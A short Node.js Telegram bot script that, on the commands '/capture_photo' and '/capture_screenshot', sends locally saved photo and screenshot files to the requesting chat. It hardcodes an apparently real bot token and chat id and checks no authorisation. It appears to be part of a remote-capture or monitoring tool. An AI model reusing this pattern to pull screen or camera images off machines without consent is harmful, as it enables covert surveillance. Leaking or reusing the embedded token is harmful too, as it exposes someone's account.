const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');

const botToken = '6785851652:AAHxzadEKpMANP2vfVfpjiPFegNX0lToDAw';
const chatId = '578828566';
const bot = new TelegramBot(botToken, { polling: true });

bot.onText(/\/capture_photo/, (msg) => {
    const chatId = msg.chat.id;
    const photoPath = path.join(__dirname, 'photo.png');
    if (fs.existsSync(photoPath)) {
        bot.sendPhoto(chatId, photoPath, { caption: 'Captured Photo' });
    } else {
        bot.sendMessage(chatId, 'No photo available.');
    }
});

bot.onText(/\/capture_screenshot/, (msg) => {
    const chatId = msg.chat.id;
    const screenshotPath = path.join(__dirname, 'screenshot.png');
    if (fs.existsSync(screenshotPath)) {
        bot.sendPhoto(chatId, screenshotPath, { caption: 'Captured Screenshot' });
    } else {
        bot.sendMessage(chatId, 'No screenshot available.');
    }
});
